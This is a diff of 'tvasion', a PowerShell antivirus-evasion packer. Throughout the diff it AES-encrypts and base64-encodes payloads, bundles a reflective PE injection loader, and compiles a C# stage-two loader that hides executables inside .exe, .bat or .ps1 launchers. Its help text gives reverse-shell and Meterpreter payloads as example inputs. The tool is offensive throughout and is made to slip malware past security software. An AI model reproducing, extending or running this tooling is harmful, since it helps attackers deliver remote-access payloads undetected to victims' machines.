@@ -9,6 +9,8 @@ param(
     [switch]$d
 );
 
+Set-StrictMode -Version 2
+
 # aes encrypt payload, put in template from path and return template with payload included in string
 class AESBASE64template {
 
@@ -47,7 +49,6 @@ class AESBASE64template {
     AESBASE64template($data, [String] $templateData) {
         $this.data = $data;
         $this.templateData = $templateData;
-        $this.generateRandom();
     }
     
     # return AES key, create if not exist
@@ -76,22 +77,20 @@ class AESBASE64template {
     
     # render & return template with AES encrypted payload pasted
     [String] render() {
-    
         if ($this.base64AESEncryptedString.length -eq 0) {
             $this.crypt();
         }
-        
+                          
         # replace aes key in template
         $this.regexReplace($([AESBASE64template]::regexKey), $this.randomAESKey);
         
         # replace base 64 encoded, AES encoded payload in template
         $this.regexReplace($([AESBASE64template]::regexEncryptedString), $this.base64AESEncryptedString);
-        
+
         return $this.templateData;
     }        
 
-    [Void] regexReplace([String] $regex, [String] $replacement) {
-        
+    [Void] regexReplace([String] $regex, [String] $replacement) {        
         $variable_key = Select-String $regex -input $this.templateData;    
         if ($variable_key.matches.length -gt 0 -and $variable_key.matches.groups.length -gt 0) {
             $this.templateData = $this.templateData -replace [regex]::escape($variable_key.matches.groups[1].Value), $replacement
@@ -103,32 +102,33 @@ class AESBASE64template {
     
     # AES encrypt payload
     crypt() {
-        if ($this.base64AESKeyString.length -eq 0 -or $this.randomAESIV.length -eq 0) {
+        if ($this.randomAESKey.length -eq 0 -or $this.randomAESIV.length -eq 0) {
             $this.instanceAES();
         }
-        $encryptor = $this.aesManaged.CreateEncryptor();    
-        $encryptedData = $encryptor.TransformFinalBlock($this.data, 0, $this.data.Length);
+        $encryptor = $this.aesManaged.CreateEncryptor();                            
+        $encryptedData = $encryptor.TransformFinalBlock($this.data, 0, $this.data.length);
         [byte[]] $fullData = $this.aesManaged.IV + $encryptedData;
         $this.aesManaged.Dispose();
         $this.base64AESEncryptedString = [System.Convert]::ToBase64String($fullData);
     }
      
     # initialize AES 
-    instanceAES() {   
-        $this.aesManaged = New-Object "System.Security.Cryptography.AesManaged";
+    instanceAES() {  
+        $this.generateRandom();
+        $this.aesManaged = [System.Security.Cryptography.AesManaged]::new();
         $this.aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
         $this.aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; 
         $this.aesManaged.BlockSize = 128;
         $this.aesManaged.KeySize = 128;
-        $this.aesManaged.IV = [System.Text.Encoding]::UTF8.GetBytes($this.randomAESIV);
+        $this.aesManaged.IV = [System.Text.Encoding]::UTF8.GetBytes($this.randomAESIV);                       
         $this.aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($this.randomAESKey); 
     }
     
     # generate random hex for aes key, iv
    generateRandom() {
-        $this.randomAESIV = -join ((48..57) + (97..102)  | Get-Random -Count 16 | % {[char]$_});
+        $this.randomAESIV = -join ((48..57) + (97..102)  | Get-Random -Count 16 | % {[char]$_}); 
         for ($i = 0; $i -le 31; $i++) {
-            $this.randomAESKey += -join ((48..57) + (97..101) | Get-Random -Count 1 | % {[char]$_}); 
+            $this.randomAESKey += -join ((48..57) + (97..102) | Get-Random -Count 1 | % {[char]$_}); 
         } 
     }     
 }
@@ -138,37 +138,43 @@ class Ps1Template : AESBASE64template {
 
     [String] $inType;
     
-    Ps1Template($data,  [String] $inType) {
-        $this.data = $data;
-        $this.generateRandom();        
-        $this.inType = $inType;        
+    Ps1Template($data,  [String] $inType) {     
+        $this.inType = $inType;   
                 
         # binary input, default_exe.ps1 template
         if ($this.inType -eq "raw") {
             $this.templateData = get-content -raw "$($PSScriptRoot)/templates/default_exe.ps1";
-       
-       # powershell input, default.ps1 template
+            $this.data = $data;
+      
+        # powershell input, default.ps1 template
         } else {
+            $this.data = [System.Text.Encoding]::UTF8.GetBytes($data); 
             $this.templateData = get-content -raw "$($PSScriptRoot)/templates/default.ps1";
         }        
-        $this.createPayload();
+       $this.createPayload();
     }
     
     # if custom ps1 -> ps1 template is set
-    Ps1Template($data,  [String]$inType, [String] $templatePath) : base($data, $templatePath)  {     
+    Ps1Template($data,  [String] $inType, [String] $templatePath) {     
         $this.inType = $inType;
-        $this.templateData = get-content -raw "$($PSScriptRoot)/templates/$($this.templateData)";
+        $this.templateData = get-content -raw "$($PSScriptRoot)/templates/$($templatePath)";
+        if ($this.inType -eq "ps1") {
+            $this.data = [System.Text.Encoding]::UTF8.GetBytes($data); 
+        } else {
+            $this.data = $data;
+        }
         $this.createPayload();
     }
     
     createPayload() {
-        
+
         # binary input, default_exe.ps1 template
         if ($this.inType -eq "raw") {
-        
-            # add ReflectivePEInjection function to payload   
-            $reflectivedllinjectionBytes = [System.IO.File]::ReadAllBytes($PSScriptRoot + "/templates/lib/Invoke-ReflectivePEInjection.ps1");
-            $this.data = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $this.data;          
+
+           # add ReflectivePEInjection function to payload   
+           $reflectivedllinjectionString = Get-Content -raw "$($PSScriptRoot)/templates/lib/Invoke-ReflectivePEInjection.ps1";
+           $reflectivedllinjectionBytes = [System.Text.Encoding]::UTF8.GetBytes($reflectivedllinjectionString);
+           $this.data = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $this.data;
         }
     }
 }
@@ -248,15 +254,13 @@ class tvasion {
         # bin / hex payload (.exe)
         if ($this.payload -match "^[a-f0-9]+$") {
             
-            # TODO maybe check MZ header to be sure it's executable: ~ $payload[0..4] --> M Z = 4D 5A = 77 90
-            
+            # TODO maybe check MZ header to be sure it's executable: ~ $payload[0..4] --> M Z = 4D 5A = 77 90            
             # hex string to byte, used this before while pipe support for hex was available
             #$return = @();
             #for ($i = 0; $i -lt $payload.Length ; $i += 2) {
             #    $return += [Byte]::Parse($payload.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
             #}
-            #$payload = $return;
-            
+            #$payload = $return;            
             $this.inType = "raw";
             
         # powershell payload (.ps1)
@@ -291,9 +295,9 @@ class tvasion {
             
             # NOTICE: include template type: object orientated style
             if ($this.templatePath.length -gt 0) {
-                $ps1Template = [Ps1Template]::new([System.Text.Encoding]::UTF8.GetBytes($this.payload), $this.inType, $this.templatePath);
+                $ps1Template = [Ps1Template]::new($this.payload, $this.inType, $this.templatePath);
             } else {
-                $ps1Template = [Ps1Template]::new([System.Text.Encoding]::UTF8.GetBytes($this.payload), $this.inType);
+                $ps1Template = [Ps1Template]::new($this.payload, $this.inType);
             }
            $ps1Template.render() > "$($this.outDir)/$($this.outFileName).$($this.outType)"; 
 
@@ -305,7 +309,8 @@ class tvasion {
 
         # Windows executable payload compiled into C# launcher (.exe) -t exe
         } elseif ($this.outType -eq "exe") { 
-
+            
+            # NOTICE: include template type functional style
             $this.generateExe();  
         }  
         write-host "tvasion: payload written to file: $($this.outDir)/$($this.outFileName).$($this.outType)"; 
@@ -326,11 +331,58 @@ class tvasion {
 
         # default_exe.cs template
         if ($this.inType -eq "raw") {
+            
+            # prepare / compile encrypted binary which include compressed payload and PE loader (stage2). see: templates/Stage2_exe.cs for workflow
+            
+            # compress payload
+            $output =  [System.IO.MemoryStream]::new();
+            $gzipStream = [System.IO.Compression.GzipStream]::new($output, [IO.Compression.CompressionMode]::Compress);
+            $gzipStream.Write( $this.payload, 0, $this.payload.length);
+            $gzipStream.Close();
+            $output.Close();
+            $this.payload = $output.ToArray();
+            
+            # encode payload base64
+            $this.payload = [System.Convert]::ToBase64String($this.payload);
+            
+            # add payload to Stage2_exe.cs
+            $stage2 = Get-Content -raw "$($PSScriptRoot)/templates/lib/Stage2_exe.cs";           
+            $variable_key = Select-String '(?:payloadBASE64 = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))' -input $stage2;    
+            if ($variable_key.matches.length -gt 0 -and $variable_key.matches.groups.length -gt 0) {
+                $stage2 = $stage2 -replace [regex]::escape($variable_key.matches.groups[1].Value), $this.payload;
+            } else {
+                throw "tvasion: regular expression for payloadBASE64 regex does not match in template: $($PSScriptRoot)/templates/lib/Stage2_exe.cs";
+                return;
+            } 
+            
+            # create temp file for compiler and compile         
+            if ($this.debug) {
+                $tmpFileMonoStage = "$($this.outDir)/$($this.outFileName)_DEBUG.cs";
+                $tmpFileMonoStageOut = "$($this.outDir)/$($this.outFileName)_DEBUG.dll"
+            } else {
+                $tmpFileMonoStage = [System.IO.Path]::GetTempFileName(); 
+                $tmpFileMonoStageOut = [System.IO.Path]::GetTempFileName();
+            }              
+            $stage2 > $tmpFileMonoStage;
+            mcs $tmpFileMonoStage -platform:x64 -target:library -unsafe -optimize -out:$tmpFileMonoStageOut
+            
+            # check if compiled file is there
+            if (![System.IO.File]::Exists($tmpFileMonoStageOut)) {
+                throw "tvasion: can't open $($tmpFileMonoStageOut) compiled from: $($PSScriptRoot)/templates/lib/Stage2_exe.cs . Check for compilation errors";
+                return;
+            }
+               
+            # set stage2 (payload + PE loader) as payload for our template
+            $this.payload = [System.IO.File]::ReadAllBytes($tmpFileMonoStageOut);     
+            
+            if (!$this.debug) {
+                Remove-Item –Path "$tmpFileMonoStage";
+                Remove-Item –Path "$tmpFileMonoStageOut";
+            }
             $this.loadDefaultTemplateIfNotSet("default_exe.cs");
         
         # default.cs template
-        } else {    
-
+        } else {
             $this.payload = [System.Text.Encoding]::Unicode.GetBytes($this.payload);
             $this.loadDefaultTemplateIfNotSet("default.cs");
         }
@@ -345,8 +397,7 @@ class tvasion {
         $aesTemplate = [AESBASE64template]::new($this.payload, $this.templateData);
         $aesTemplate.render() > $tmpFileMono; 
         
-        #mcs $tmpFileMono -platform:x86 -unsafe -out:"$($this.outDir)/$($this.outFileName).$($this.outType)"# input is available via file only, no stdin pipe
-        mcs $tmpFileMono -platform:x64 -unsafe -out:"$($this.outDir)/$($this.outFileName).$($this.outType)" 
+        mcs $tmpFileMono -platform:x64 -out:"$($this.outDir)/$($this.outFileName).$($this.outType)" 
         if (!$this.debug) {
             Remove-Item –Path "$tmpFileMono";
         }
@@ -361,13 +412,11 @@ class tvasion {
             # add ReflectivePEInjection function to payload   
             $reflectivedllinjectionBytes = [System.IO.File]::ReadAllBytes($PSScriptRoot + "/templates/lib/Invoke-ReflectivePEInjection.ps1");
             $this.payload = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $this.payload;  
-            #$template = get-content -raw "$($PSScriptRoot)/templates/default_exe_bat.ps1";
             $this.loadDefaultTemplateIfNotSet("default_exe_bat.ps1");  
         
         # powershell input, default.ps1 template
         } else {
             $this.payload = [System.Text.Encoding]::UTF8.GetBytes($this.payload);
-            #$template = get-content -raw "$($PSScriptRoot)/templates/default_bat.ps1";
             $this.loadDefaultTemplateIfNotSet("default_bat.ps1"); 
         }
     
@@ -384,9 +433,6 @@ class tvasion {
         if ($this.debug) {
             $stageTemplate.templateData > "$($this.outDir)/$($this.outFileName)_DEBUG.ps1";
         }
-        
-
-        #$stage = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($stageTemplate.templateData)); 
         
         # remove new lines, NOTICE: default_bat.ps1 template need ; after each command at the moment because of placement in one line quickly
         $stage = $stageTemplate.templateData -replace "`n", "";
@@ -450,9 +496,9 @@ class tvasion {
         write-host '-h                        display this help                                       optional';
         write-host 'examples:';
         write-host "./tvasion.ps1 -t exe tests/ReverseShell.ps1                                       # generate windows executable (.exe) from powershell";
-        write-host './tvasion.ps1 -t exe tests/ReverseShell_c#amd64.exe                               # generate windows executable (.exe) from excecutable';
+        write-host './tvasion.ps1 -t exe out/Meterpreter_amd64.exe                                    # generate windows executable (.exe) from executable';
         write-host './tvasion.ps1 -t bat tests/ReverseShell.ps1                                       # generate batch (.bat) from powershell';
-        write-host './tvasion.ps1 -t ps1 tests/ReverseShell_c#amd64.exe -f mytpl1.ps1 -o ../ -d       # ... .exe -> .ps1, custom template (-f), out dir (-o), debug (-d)';
+        write-host './tvasion.ps1 -t ps1 out/Meterpreter_amd64.exe -f mytpl1.ps1 -o ../ -d            # ... .exe -> .ps1, custom template (-f), out dir (-o), debug (-d)';
     }   
 }
 
